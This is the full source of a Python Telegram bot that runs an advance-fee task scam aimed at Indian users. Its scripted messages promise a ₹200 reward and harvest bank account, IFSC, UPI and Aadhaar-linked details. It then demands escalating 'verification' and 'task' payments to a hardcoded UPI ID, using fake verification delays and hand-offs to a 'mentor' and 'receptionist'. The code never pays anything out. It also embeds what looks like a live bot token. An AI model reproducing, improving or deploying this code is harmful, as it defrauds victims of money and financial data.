import asyncio
import re
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardRemove
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.error import TimedOut, NetworkError


TOKEN = "8162858202:AAGXcvcuCeSnIt1k_AEtqkkwfTJljo1ZIUs"
ADMIN_CHAT_ID = 7001869215

# PATTERNS
START_CODE_PATTERN = r"^[A-Z]{2}[0-9]{5}$"      # DD73548
MENTOR_CODE_PATTERN = r"^[A-Z]{5}[0-9]{7}$"     # TRCZM8875910

UPI_ID = "maryjoyce19@ibl"
HOLDER_NAME = "Shirkant Sahu"

# ✅ OPTION PAYMENT RECEIVED IMAGE (same for all 3 options)
OPTION_RECEIVED_IMAGE_ID = "AgACAgEAAxkBAAIEn2mOL6umrZBJkxuxBnTKUDkHF5xAAAKNC2sbR2FwRJdUg9xn21-sAQADAgADeQADOgQ"

# ✅ NEW IMAGE FOR DATA TASK FOUND
DATA_TASK_IMAGE_ID = "AgACAgEAAxkBAAIPL2mRUvGUcEu8CWBS8LLhGjJk2zKgAAIqDGsbi-6JROeI6QLkpe5jAQADAgADeQADOgQ"

# ✅ NEW DATA TASK OPTION IMAGES
DATA_OPTION_1_IMAGE = "AgACAgEAAxkBAAIHymmPFflCAAHTjbyoqRE6YKNrd8UtiQACeAtrG0dheET_6jZP99jMigEAAwIAA3kAAzoE"
DATA_OPTION_2_IMAGE = "AgACAgEAAxkBAAIHy2mPFfq5msmN5pWbEI6MqCaNdBw8AAJ5C2sbR2F4RN44jQABiwED6QEAAwIAA3kAAzoE"
DATA_OPTION_3_IMAGE = "AgACAgEAAxkBAAIHzGmPFf_AWJG99E26rzeYQQnYYAEZAAJ6C2sbR2F4RMxMhGqC9FO4AQADAgADeQADOgQ"


# =========================================================
# ✅ NEW SESSION + ABUSE CONTROL SYSTEM (FIXED)
# =========================================================

BAD_WORDS = [
    "madarchod", "madar", "bhosdike", "bhosdi", "chutiya", "gandu", "harami",
    "lund", "randi", "bsdk", "behenchod", "bhenchod", "maa ki", "maa ka",
    "fuck", "bitch", "asshole",
    "mc", "bc"
]

def contains_bad_words(text: str) -> bool:
    text = text.lower().strip()

    # Remove symbols (so mc!!, bc.. also detect)
    text = re.sub(r"[^a-z0-9\s]", " ", text)

    words = text.split()

    for w in BAD_WORDS:
        # Special handling for very small words (mc/bc)
        if w in ["mc", "bc"]:
            if w in words and len(words) <= 4:
                return True
        else:
            # Full word match only
            if re.search(rf"\b{re.escape(w)}\b", text):
                return True

    return False


# =========================================================
# ✅ FIXED USER STATE SYSTEM (IMPORTANT FIX)
# =========================================================
# 🔥 CHANGE: bot_data se hata ke user_data me store kiya
# =========================================================

def get_user_state(context, chat_id):
    if "user_state" not in context.bot_data:
        context.bot_data["user_state"] = {}
    return context.bot_data["user_state"].get(chat_id, None)

def set_user_state(context, chat_id, state):
    if "user_state" not in context.bot_data:
        context.bot_data["user_state"] = {}
    context.bot_data["user_state"][chat_id] = state


def is_user_banned(context, chat_id):
    if "banned_users" not in context.bot_data:
        context.bot_data["banned_users"] = {}
    return context.bot_data["banned_users"].get(chat_id, False)


def ban_user(context, chat_id):
    if "banned_users" not in context.bot_data:
        context.bot_data["banned_users"] = {}
    context.bot_data["banned_users"][chat_id] = True


def get_warning_count(context, chat_id):
    if "warning_users" not in context.bot_data:
        context.bot_data["warning_users"] = {}
    return context.bot_data["warning_users"].get(chat_id, 0)


def add_warning(context, chat_id):
    if "warning_users" not in context.bot_data:
        context.bot_data["warning_users"] = {}
    context.bot_data["warning_users"][chat_id] = get_warning_count(context, chat_id) + 1


def reset_warning(context, chat_id):
    if "warning_users" not in context.bot_data:
        context.bot_data["warning_users"] = {}
    context.bot_data["warning_users"][chat_id] = 0


# =========================================================


FORM_MESSAGE = """💎 Reward Claim Form – ₹200 Bonus

🎉 Congratulations! You are eligible to receive a ₹200 Reward Bonus.
Please provide accurate details to successfully process your reward.
Incorrect or mismatched information may result in disqualification.
📌 Kindly enter your age exactly as mentioned on your Aadhaar card.

🔹 Required Information:
Full Name:
Occupation:
Gender:
Age (as per Aadhaar):
Account Holder Name:
Bank Account Number:
IFSC Code:
Bank Name:

          OR

UPI ID:
Registered UPI Name:

UPI App Name (PhonePe / Google Pay / Paytm etc.)
"""

PAYMENT_MESSAGE = """🔐 Secure Verification & Processing
To initiate the release of your ₹200 reward, a ₹20 verification processing fee is required as part of our secure validation procedure.

💼 Select Your Preferred Payment Method:

💳 UPI Transfer – Send payment via our official UPI ID

Kindly select the above option to proceed with the verification process.
"""

payment_keyboard = ReplyKeyboardMarkup(
    [["💳 UPI"]],
    resize_keyboard=True,
    one_time_keyboard=True
)

QR_SCREENSHOT_MESSAGE = (
    "📌 Pay this QR and then send ONLY payment screenshot here\n\n"
    "⚠️ Do not type message, upload screenshot only."
)


# -------------------- AUTO RETRY FUNCTIONS --------------------

async def safe_send_message(bot, chat_id, text, retries=3, delay=3, **kwargs):
    for i in range(retries):
        try:
            return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except (TimedOut, NetworkError):
            if i == retries - 1:
                return None
            await asyncio.sleep(delay)


async def safe_send_photo(bot, chat_id, photo, caption=None, retries=3, delay=3, **kwargs):
    for i in range(retries):
        try:
            return await bot.send_photo(chat_id=chat_id, photo=photo, caption=caption, **kwargs)
        except (TimedOut, NetworkError):
            if i == retries - 1:
                return None
            await asyncio.sleep(delay)


# -------------------- AUTO SYSTEM SECOND MESSAGE --------------------

async def auto_system_checking_second(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    chat_id = job.chat_id

    if context.bot_data.get(f"second_check_sent_{chat_id}") == True:
        return

    context.bot_data[f"second_check_sent_{chat_id}"] = True
    context.bot_data[f"waiting_second_message_{chat_id}"] = False

    context.bot_data[f"system_final_mode_{chat_id}"] = True
    set_user_state(context, chat_id, "SYSTEM_CHECKING")

    await safe_send_message(context.bot, chat_id, "⚙️ system is checking wait carefully")


# -------------------- NEW AUTO DATA TASK FOUND MESSAGE --------------------

async def auto_data_task_found(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    chat_id = job.chat_id

    if context.bot_data.get(f"data_task_sent_{chat_id}") == True:
        return

    context.bot_data[f"data_task_sent_{chat_id}"] = True

    await safe_send_message(context.bot, chat_id, "✅ Data task found successfully")

    await safe_send_photo(context.bot, chat_id, DATA_TASK_IMAGE_ID)

    text_msg = """✅ Task Availability Options

🎯 Congratulations! Your data task is ready.
Now select ONE option to activate your task and withdraw profit.

🔹 Option 1: Pay ₹300 → Withdraw ₹720 (₹520 + ₹200 Bonus)
🔹 Option 2: Pay ₹800 → Withdraw ₹1,240 (₹1,040 + ₹200 Bonus)
🔹 Option 3: Pay ₹1,100 → Withdraw ₹1,630 (₹1,430 + ₹200 Bonus)

📌 Please choose ONLY ONE option to continue.
⚠️ Payment amount must match the selected option.
"""

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Option 1", callback_data="data_opt1")],
        [InlineKeyboardButton("Option 2", callback_data="data_opt2")],
        [InlineKeyboardButton("Option 3", callback_data="data_opt3")]
    ])

    set_user_state(context, chat_id, "WAIT_DATA_OPTION")
    await safe_send_message(context.bot, chat_id, text_msg, reply_markup=keyboard)


# -------------------- FORM VALIDATION --------------------

def is_valid_bank_form(text: str) -> bool:
    text = text.strip()

    required_keywords = [
        "full name",
        "occupation",
        "gender",
        "age",
        "account holder name",
        "bank account number",
        "ifsc code",
        "bank name"
    ]

    keyword_count = 0
    for key in required_keywords:
        if key in text.lower():
            keyword_count += 1

    if keyword_count >= 6:
        return True

    lines = [line.strip() for line in text.split("\n") if line.strip()]

    if len(lines) >= 8:
        ifsc_pattern = r"^[A-Z]{4}0[A-Z0-9]{6}$"
        account_pattern = r"^\d{9,18}$"

        ifsc_found = any(re.match(ifsc_pattern, line.upper()) for line in lines)
        account_found = any(re.match(account_pattern, line) for line in lines)

        if ifsc_found and account_found:
            return True

    return False


def is_valid_upi_form(text: str) -> bool:
    text = text.strip()

    upi_pattern = r"[a-zA-Z0-9.\-_]{2,}@[a-zA-Z]{2,}"

    if "upi id" in text.lower() and "registered upi name" in text.lower():
        if re.search(upi_pattern, text):
            return True

    lines = [line.strip() for line in text.split("\n") if line.strip()]
    if len(lines) >= 2:
        if re.search(upi_pattern, lines[0]):
            return True

    if re.search(upi_pattern, text):
        return True

    return False


# -------------------- START CODE VERIFICATION --------------------

async def auto_verification(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    chat_id = job.chat_id

    if context.bot_data.get(f"auto_done_{chat_id}") == True:
        return

    context.bot_data[f"auto_done_{chat_id}"] = True

    await safe_send_message(context.bot, chat_id, "🔄 Verification in progress...")
    await asyncio.sleep(30)

    await safe_send_message(context.bot, chat_id, "✅ Your code verification successful.")
    await safe_send_message(context.bot, chat_id, FORM_MESSAGE)

    context.bot_data[f"waiting_for_form_{chat_id}"] = True
    set_user_state(context, chat_id, "WAIT_FORM")


# -------------------- MENTOR CODE VERIFICATION --------------------

async def mentor_verification(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    chat_id = job.chat_id

    context.bot_data[f"mentor_verifying_{chat_id}"] = True

    await safe_send_message(context.bot, chat_id, "🔄 Verifying mentor code...")
    await asyncio.sleep(10)

    await safe_send_message(context.bot, chat_id, "✅ Mentor code verified successfully.")

    FINAL_PHOTO_ID = "AgACAgEAAxkBAAIPK2mRUrm1kL6LHMyf-L2ggQABZyoVkQACKQxrG4vuiUTXNmnjk1-v-QEAAwIAA3kAAzoE"

    await asyncio.sleep(3)

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Option 1", callback_data="opt1")],
        [InlineKeyboardButton("Option 2", callback_data="opt2")],
        [InlineKeyboardButton("Option 3", callback_data="opt3")]
    ])

    await safe_send_photo(
        context.bot,
        chat_id,
        FINAL_PHOTO_ID,
        caption="""✅ Task Availability Options

🔹 Option 1: Pay ₹100 → Withdraw ₹330 (₹130 + ₹200 Bonus)
🔹 Option 2: Pay ₹300 → Withdraw ₹590 (₹390 + ₹200 Bonus)
🔹 Option 3: Pay ₹700 → Withdraw ₹1,110 (₹910 + ₹200 Bonus)

📌 Please select ONE option to continue.
⚠️ Payment must match the selected option amount.""",
        reply_markup=keyboard
    )

    set_user_state(context, chat_id, "WAIT_OPTION")

    context.bot_data[f"waiting_for_ok_{chat_id}"] = False
    context.bot_data[f"waiting_for_form_{chat_id}"] = False
    context.bot_data[f"waiting_for_payment_option_{chat_id}"] = False
    context.bot_data[f"waiting_for_screenshot_{chat_id}"] = False
    context.bot_data[f"payment_checking_{chat_id}"] = False
    context.bot_data[f"auto_done_{chat_id}"] = False

    context.bot_data[f"waiting_for_code_{chat_id}"] = False
    context.bot_data[f"mentor_code_mode_{chat_id}"] = False
    context.bot_data[f"reupload_required_{chat_id}"] = False

    context.bot_data[f"withdraw_completed_{chat_id}"] = False
    context.bot_data[f"mentor_verifying_{chat_id}"] = False

    # ✅ FIXED EXTRA FLAG
    context.bot_data[f"waiting_for_mentor_ok_{chat_id}"] = False


# -------------------- START COMMAND --------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if is_user_banned(context, chat_id):
        return

    context.bot_data[f"waiting_for_code_{chat_id}"] = True
    context.bot_data[f"waiting_for_ok_{chat_id}"] = False
    context.bot_data[f"waiting_for_form_{chat_id}"] = False
    context.bot_data[f"waiting_for_payment_option_{chat_id}"] = False
    context.bot_data[f"waiting_for_screenshot_{chat_id}"] = False
    context.bot_data[f"payment_checking_{chat_id}"] = False
    context.bot_data[f"auto_done_{chat_id}"] = False

    context.bot_data[f"reupload_required_{chat_id}"] = False
    context.bot_data[f"mentor_code_mode_{chat_id}"] = False

    context.bot_data[f"withdraw_completed_{chat_id}"] = False
    context.bot_data[f"option_payment_mode_{chat_id}"] = False
    context.bot_data[f"mentor_verifying_{chat_id}"] = False

    context.bot_data[f"waiting_after_read_image_{chat_id}"] = False
    context.bot_data[f"waiting_second_message_{chat_id}"] = False
    context.bot_data[f"second_check_sent_{chat_id}"] = False
    context.bot_data[f"system_final_mode_{chat_id}"] = False

    context.bot_data[f"data_task_sent_{chat_id}"] = False

    # ✅ NEW FIX FLAG
    context.bot_data[f"waiting_for_mentor_ok_{chat_id}"] = False

    set_user_state(context, chat_id, "WAIT_CODE")
    reset_warning(context, chat_id)

    await update.message.reply_text(
        "👋 Welcome to ManagerRoshni!\n"
        "Nice to meet you.\n\n"
        "🔹 🔐 For secure withdrawal, please enter your withdrawal code below.",
        reply_markup=ReplyKeyboardRemove()
    )


# -------------------- ADMIN UNBAN COMMAND --------------------

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return

    try:
        user_id = int(context.args[0])
        if "banned_users" not in context.bot_data:
            context.bot_data["banned_users"] = {}
        context.bot_data["banned_users"][user_id] = False
        await update.message.reply_text(f"✅ User {user_id} unbanned successfully.")
    except:
        await update.message.reply_text("❌ Usage: /unban user_id")


# -------------------- ADMIN RESPONSE --------------------

async def admin_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    chat_id = query.message.chat_id

    if is_user_banned(context, chat_id):
        return

    if data == "data_opt1":
        await query.edit_message_reply_markup(reply_markup=None)

        context.bot_data[f"option_payment_mode_{chat_id}"] = True
        context.bot_data[f"waiting_for_screenshot_{chat_id}"] = True
        set_user_state(context, chat_id, "WAIT_SCREENSHOT")

        context.bot_data[f"system_final_mode_{chat_id}"] = False

        await safe_send_photo(
            context.bot,
            chat_id,
            DATA_OPTION_1_IMAGE,
            caption="💳 Pay Option 1 Amount & Upload Payment Screenshot 📸"
        )

        await safe_send_message(context.bot, chat_id, QR_SCREENSHOT_MESSAGE)
        return

    if data == "data_opt2":
        await query.edit_message_reply_markup(reply_markup=None)

        context.bot_data[f"option_payment_mode_{chat_id}"] = True
        context.bot_data[f"waiting_for_screenshot_{chat_id}"] = True
        set_user_state(context, chat_id, "WAIT_SCREENSHOT")

        context.bot_data[f"system_final_mode_{chat_id}"] = False

        await safe_send_photo(
            context.bot,
            chat_id,
            DATA_OPTION_2_IMAGE,
            caption="💳 Pay Option 2 Amount & Upload Payment Screenshot 📸"
        )

        await safe_send_message(context.bot, chat_id, QR_SCREENSHOT_MESSAGE)
        return

    if data == "data_opt3":
        await query.edit_message_reply_markup(reply_markup=None)

        context.bot_data[f"option_payment_mode_{chat_id}"] = True
        context.bot_data[f"waiting_for_screenshot_{chat_id}"] = True
        set_user_state(context, chat_id, "WAIT_SCREENSHOT")

        context.bot_data[f"system_final_mode_{chat_id}"] = False

        await safe_send_photo(
            context.bot,
            chat_id,
            DATA_OPTION_3_IMAGE,
            caption="💳 Pay Option 3 Amount & Upload Payment Screenshot 📸"
        )

        await safe_send_message(context.bot, chat_id, QR_SCREENSHOT_MESSAGE)
        return

    if data == "opt1":
        await query.edit_message_reply_markup(reply_markup=None)

        context.bot_data[f"option_payment_mode_{chat_id}"] = True
        context.bot_data[f"waiting_for_screenshot_{chat_id}"] = True
        set_user_state(context, chat_id, "WAIT_SCREENSHOT")

        context.bot_data[f"system_final_mode_{chat_id}"] = False

        PHOTO1 = "AgACAgEAAxkBAAID4mmOF6F3QBVEjfdQLouElCmWJAyGAAKAC2sbR2FwROfMJbull13xAQADAgADeAADOgQ"

        await safe_send_photo(
            context.bot,
            chat_id,
            PHOTO1,
            caption="💳 Pay Option 1 Amount & Upload Payment Screenshot 📸"
        )

        await safe_send_message(context.bot, chat_id, QR_SCREENSHOT_MESSAGE)
        return

    if data == "opt2":
        await query.edit_message_reply_markup(reply_markup=None)

        context.bot_data[f"option_payment_mode_{chat_id}"] = True
        context.bot_data[f"waiting_for_screenshot_{chat_id}"] = True
        set_user_state(context, chat_id, "WAIT_SCREENSHOT")

        context.bot_data[f"system_final_mode_{chat_id}"] = False

        PHOTO2 = "AgACAgEAAxkBAAID5GmOGDe-2EPe1es_-JldlAN3C-pgAAKBC2sbR2FwRJYOPckrcUWSAQADAgADeQADOgQ"

        await safe_send_photo(
            context.bot,
            chat_id,
            PHOTO2,
            caption="💳 Pay Option 2 Amount & Upload Payment Screenshot 📸"
        )

        await safe_send_message(context.bot, chat_id, QR_SCREENSHOT_MESSAGE)
        return

    if data == "opt3":
        await query.edit_message_reply_markup(reply_markup=None)

        context.bot_data[f"option_payment_mode_{chat_id}"] = True
        context.bot_data[f"waiting_for_screenshot_{chat_id}"] = True
        set_user_state(context, chat_id, "WAIT_SCREENSHOT")

        context.bot_data[f"system_final_mode_{chat_id}"] = False

        PHOTO3 = "AgACAgEAAxkBAAID5mmOGJ4ztgb7EsOxVx9vSJZ6uQUdAAKCC2sbR2FwRE6LDXadnGdpAQADAgADeQADOgQ"

        await safe_send_photo(
            context.bot,
            chat_id,
            PHOTO3,
            caption="💳 Pay Option 3 Amount & Upload Payment Screenshot 📸"
        )

        await safe_send_message(context.bot, chat_id, QR_SCREENSHOT_MESSAGE)
        return

    if data.startswith("paid_"):
        user_id = int(data.split("_")[1])

        context.bot_data[f"payment_checking_{user_id}"] = False
        context.bot_data[f"waiting_for_screenshot_{user_id}"] = False
        context.bot_data[f"waiting_for_payment_option_{user_id}"] = False
        context.bot_data[f"waiting_for_form_{user_id}"] = False

        context.bot_data[f"reupload_required_{user_id}"] = False
        context.bot_data[f"withdraw_completed_{user_id}"] = False

        await safe_send_message(context.bot, user_id, "✅ Payment received successfully!")

        if context.bot_data.get(f"option_payment_mode_{user_id}") == True:
            await safe_send_photo(
                context.bot,
                user_id,
                OPTION_RECEIVED_IMAGE_ID,
                caption="✨ 𝑹𝒆𝒂𝒅 𝒄𝒂𝒓𝒆𝒇𝒖𝒍𝒍𝒚\n\n✅ 𝑻𝒉𝒆𝒏 𝒓𝒆𝒑𝒍𝒚 𝒐𝒌𝒂𝒚."
            )

            context.bot_data[f"waiting_after_read_image_{user_id}"] = True
            set_user_state(context, user_id, "WAIT_AFTER_READ")

            context.bot_data[f"waiting_second_message_{user_id}"] = False
            context.bot_data[f"second_check_sent_{user_id}"] = False
            context.bot_data[f"system_final_mode_{user_id}"] = False

            context.bot_data[f"data_task_sent_{user_id}"] = False
            context.bot_data[f"option_payment_mode_{user_id}"] = False

        else:
            await safe_send_message(
                context.bot,
                user_id,
                "💼 Withdrawal processing fee received.\n\n"
                "📌 Now contact your mentor Varun Sir. He will give you a one-time code.\n"
                "Send that code to me to complete your withdrawal.\n\n"
                "📩 Message Varun Sir here: @Mentor_8756\n\n"
                "✅ Reply Ok / Yes after you get the code."
            )

            # ✅ FIX: WAIT OK THEN ASK CODE
            context.bot_data[f"waiting_for_code_{user_id}"] = False
            context.bot_data[f"mentor_code_mode_{user_id}"] = True
            context.bot_data[f"waiting_for_mentor_ok_{user_id}"] = True
            set_user_state(context, user_id, "WAIT_MENTOR_OK")

        await query.edit_message_caption(query.message.caption + "\n\n✅ Marked as PAID")
        return

    elif data.startswith("notpaid_"):
        user_id = int(data.split("_")[1])

        context.bot_data[f"payment_checking_{user_id}"] = False

        context.bot_data[f"waiting_for_screenshot_{user_id}"] = True
        set_user_state(context, user_id, "WAIT_SCREENSHOT")

        context.bot_data[f"reupload_required_{user_id}"] = True

        await safe_send_message(
            context.bot,
            user_id,
            "❌ Payment Not Received!\n\n📌 Please upload real payment screenshot!"
        )

        await query.edit_message_caption(query.message.caption + "\n\n❌ Marked as NOT RECEIVED")
        return

    elif data.startswith("receive_"):
        user_id = int(data.split("_")[1])

        context.bot_data[f"withdraw_completed_{user_id}"] = True
        set_user_state(context, user_id, "DONE")

        context.bot_data[f"payment_checking_{user_id}"] = False
        context.bot_data[f"waiting_for_screenshot_{user_id}"] = False
        context.bot_data[f"waiting_for_payment_option_{user_id}"] = False
        context.bot_data[f"waiting_for_form_{user_id}"] = False
        context.bot_data[f"waiting_for_ok_{user_id}"] = False
        context.bot_data[f"waiting_for_code_{user_id}"] = False
        context.bot_data[f"mentor_code_mode_{user_id}"] = False
        context.bot_data[f"system_final_mode_{user_id}"] = False
        context.bot_data[f"waiting_after_read_image_{user_id}"] = False
        context.bot_data[f"waiting_second_message_{user_id}"] = False
        context.bot_data[f"data_task_sent_{user_id}"] = False
        context.bot_data[f"waiting_for_mentor_ok_{user_id}"] = False

        final_text = """✅ 𝑻𝑨𝑺𝑲 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 ✅
━━━━━━━━━━━━━━━━━━
🎉 Congratulations! 🎉
💎 Your all work has been COMPLETED 100%
📌 Now your withdrawal process is ready to proceed.
👩‍💼 Contact Your New Receptionist:
👉 @Amrita12_22
📩 She will provide you your withdrawal details & final confirmation.
🙏 Thank you for using our bot.
✨ Stay Connected, Stay Successful!
━━━━━━━━━━━━━━━━━━
🚀 ManagerRoshni System Activated 🚀"""

        await safe_send_message(context.bot, user_id, final_text)

        await query.edit_message_caption(query.message.caption + "\n\n✅ FINAL RECEIVE SENT")
        return


# -------------------- PHOTO HANDLER --------------------

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if is_user_banned(context, chat_id):
        return

    if chat_id == ADMIN_CHAT_ID:
        file_id = update.message.photo[-1].file_id
        await update.message.reply_text(f"✅ PHOTO FILE_ID:\n\n{file_id}")
        return

    if context.bot_data.get(f"waiting_for_screenshot_{chat_id}") != True:
        await update.message.reply_text("⚠️ Upload screenshot only after payment.")
        return

    context.bot_data[f"waiting_for_screenshot_{chat_id}"] = False
    context.bot_data[f"waiting_for_payment_option_{chat_id}"] = False

    context.bot_data[f"payment_checking_{chat_id}"] = True
    set_user_state(context, chat_id, "PAYMENT_CHECKING")

    user = update.message.from_user
    file_id = update.message.photo[-1].file_id

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Payment Received", callback_data=f"paid_{user.id}"),
            InlineKeyboardButton("❌ Not Received", callback_data=f"notpaid_{user.id}")
        ],
        [
            InlineKeyboardButton("📩 RECEIVE (Final Step)", callback_data=f"receive_{user.id}")
        ]
    ])

    caption_text = f"📥 Screenshot Received\n\n👤 {user.first_name}\n🆔 {user.id}"

    if context.bot_data.get(f"reupload_required_{chat_id}") == True:
        caption_text = f"♻️ Re-Uploaded Screenshot\n\n👤 {user.first_name}\n🆔 {user.id}"

    await safe_send_photo(
        context.bot,
        ADMIN_CHAT_ID,
        file_id,
        caption=caption_text,
        reply_markup=keyboard
    )

    if context.bot_data.get(f"reupload_required_{chat_id}") == True:
        context.bot_data[f"reupload_required_{chat_id}"] = False
        await update.message.reply_text(
            "📸 Screenshot received again!\n\n⏳ Please wait while we verify your payment.",
            reply_markup=ReplyKeyboardRemove()
        )
    else:
        await update.message.reply_text(
            "⏳ Screenshot received. Please wait for confirmation.",
            reply_markup=ReplyKeyboardRemove()
        )


# -------------------- TEXT HANDLER --------------------

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    if is_user_banned(context, chat_id):
        return

    # ✅ GET STATE
    state = get_user_state(context, chat_id)

    # ✅ FIXED BAD WORD CHECK
    if contains_bad_words(text):
        add_warning(context, chat_id)
        warn_count = get_warning_count(context, chat_id)

        if warn_count >= 3:
            ban_user(context, chat_id)
            await safe_send_message(context.bot, chat_id, "⛔ You are blocked permanently.")
            return
        else:
            await safe_send_message(context.bot, chat_id, f"⚠️ Warning {warn_count}/3: Bad language detected.")
            return

    ignore_words = ["thanks", "thank you", "thank u", "bye", "goodbye"]

    if text.lower() in ignore_words:
        return

    if context.bot_data.get(f"withdraw_completed_{chat_id}") == True:
        return

    # =====================================================
    # ✅ NEW FIX: Mentor message ke baad OK/YES check
    # =====================================================
    if context.bot_data.get(f"waiting_for_mentor_ok_{chat_id}") == True:
        if text.lower() in ["ok", "yes", "okay", "ha", "haan"]:
            context.bot_data[f"waiting_for_mentor_ok_{chat_id}"] = False
            context.bot_data[f"waiting_for_code_{chat_id}"] = True
            context.bot_data[f"mentor_code_mode_{chat_id}"] = True

            set_user_state(context, chat_id, "WAIT_CODE")

            await update.message.reply_text("📌 Please send your one-time withdrawal code.")
        else:
            await update.message.reply_text("✅ Type Ok / Yes to continue.")
        return
    # =====================================================

    # ✅ NEW FIX: If user is on option selection step and types anything
    if state in ["WAIT_OPTION", "WAIT_DATA_OPTION"]:
        await update.message.reply_text(
            "⚠️ *Invalid Response!*\n\n"
            "✅ *Choose only ONE option to continue.*\n"
            "📌 Please use the buttons below 👇",
            parse_mode="Markdown"
        )
        return

    if context.bot_data.get(f"waiting_for_screenshot_{chat_id}") == True:
        await update.message.reply_text(QR_SCREENSHOT_MESSAGE)
        return

    if context.bot_data.get(f"waiting_after_read_image_{chat_id}") == True:
        context.bot_data[f"waiting_after_read_image_{chat_id}"] = False

        context.bot_data[f"waiting_for_code_{chat_id}"] = False
        context.bot_data[f"mentor_code_mode_{chat_id}"] = False

        context.bot_data[f"waiting_second_message_{chat_id}"] = True
        context.bot_data[f"second_check_sent_{chat_id}"] = False

        set_user_state(context, chat_id, "WAIT_SECOND_MESSAGE")

        context.job_queue.run_once(auto_system_checking_second, 60, chat_id=chat_id)

        await update.message.reply_text("✅ Wait i am checking more data task")
        return

    if context.bot_data.get(f"waiting_second_message_{chat_id}") == True:
        context.bot_data[f"waiting_second_message_{chat_id}"] = False
        context.bot_data[f"second_check_sent_{chat_id}"] = True

        context.bot_data[f"system_final_mode_{chat_id}"] = True
        set_user_state(context, chat_id, "SYSTEM_CHECKING")

        await update.message.reply_text("⚙️ system is checking wait carefully")

        context.job_queue.run_once(auto_data_task_found, 60, chat_id=chat_id)
        return

    if context.bot_data.get(f"mentor_verifying_{chat_id}") == True:
        await update.message.reply_text("⏳ Please wait, mentor code is being verified…")
        return

    if context.bot_data.get(f"payment_checking_{chat_id}") == True:
        waiting_words = [
            "ok", "okk", "okay", "okey",
            "yes", "yess",
            "i am waiting", "im waiting", "waiting",
            "theek hai", "thik hai", "ha", "haan"
        ]

        if any(word in text.lower() for word in waiting_words):
            await update.message.reply_text(
                "⏳ Wait, your payment is being checked. Please wait 5 minutes."
            )
            return

    if context.bot_data.get(f"waiting_for_payment_option_{chat_id}") == True:

        if "UPI" in text.upper():
            context.bot_data[f"waiting_for_screenshot_{chat_id}"] = True
            context.bot_data[f"waiting_for_payment_option_{chat_id}"] = False

            set_user_state(context, chat_id, "WAIT_SCREENSHOT")

            await update.message.reply_text(
                "💳 UPI Payment Method\n\n"
                f"📌 UPI ID: {UPI_ID}\n"
                f"👤 Holder: {HOLDER_NAME}\n\n"
                "📌 After payment, upload screenshot here.",
                reply_markup=ReplyKeyboardRemove()
            )
            return

        await update.message.reply_text("⚠️ Please tap 💳 UPI button.")
        return

    if context.bot_data.get(f"waiting_for_form_{chat_id}") == True:

        if is_valid_bank_form(text) or is_valid_upi_form(text):
            context.bot_data[f"waiting_for_form_{chat_id}"] = False
            context.bot_data[f"waiting_for_payment_option_{chat_id}"] = True

            set_user_state(context, chat_id, "WAIT_PAYMENT_OPTION")

            await update.message.reply_text("✅ Submitted Successfully!")
            await update.message.reply_text(PAYMENT_MESSAGE, reply_markup=payment_keyboard)

        else:
            await update.message.reply_text("❌ Invalid details!\nPlease fill the form correctly.")
        return

    if context.bot_data.get(f"waiting_for_ok_{chat_id}") == True:

        if text.lower() in ["ok", "yes", "okay"]:
            context.bot_data[f"auto_done_{chat_id}"] = True
            context.bot_data[f"waiting_for_ok_{chat_id}"] = False

            await update.message.reply_text("🔄 Verification in progress...")
            await asyncio.sleep(5)

            await update.message.reply_text("✅ Your code verification successful.")

            context.bot_data[f"waiting_for_form_{chat_id}"] = True
            set_user_state(context, chat_id, "WAIT_FORM")

            await update.message.reply_text(FORM_MESSAGE)

        return

    if context.bot_data.get(f"waiting_for_code_{chat_id}") == True:

        mentor_mode = context.bot_data.get(f"mentor_code_mode_{chat_id}") == True

        if mentor_mode:
            if not re.match(MENTOR_CODE_PATTERN, text):
                await update.message.reply_text("📌 Please send your one-time withdrawal code.")
                return
        else:
            if not re.match(START_CODE_PATTERN, text):
                await update.message.reply_text("❌ Invalid code!\nPlease enter correct withdrawal code.")
                return

        context.bot_data[f"waiting_for_code_{chat_id}"] = False
        context.bot_data[f"auto_done_{chat_id}"] = False

        await update.message.reply_text(
            f"✅ Withdrawal code received: {text}\n"
            "⏳ Please wait while we verify..."
        )

        if mentor_mode:
            context.bot_data[f"waiting_for_ok_{chat_id}"] = False
            context.bot_data[f"mentor_verifying_{chat_id}"] = True
            set_user_state(context, chat_id, "MENTOR_VERIFY")
            context.job_queue.run_once(mentor_verification, 5, chat_id=chat_id)
        else:
            context.bot_data[f"waiting_for_ok_{chat_id}"] = True
            set_user_state(context, chat_id, "WAIT_OK")
            context.job_queue.run_once(auto_verification, 30, chat_id=chat_id)

        return

    # ✅ STATES CHECK (FIXED)
    if state == "WAIT_CODE":
        if context.bot_data.get(f"waiting_for_code_{chat_id}") == True:
            await update.message.reply_text("🔐 Please enter your withdrawal code.")
        return

    if state == "WAIT_FORM":
        await update.message.reply_text("📌 Please fill your form details correctly.")
        return

    if state == "WAIT_PAYMENT_OPTION":
        await update.message.reply_text(PAYMENT_MESSAGE, reply_markup=payment_keyboard)
        return

    if state == "WAIT_SCREENSHOT":
        await update.message.reply_text(QR_SCREENSHOT_MESSAGE)
        return
    
    if state == "WAIT_SECOND_MESSAGE":
        await update.message.reply_text("⚙️ system is checking wait carefully")
        return

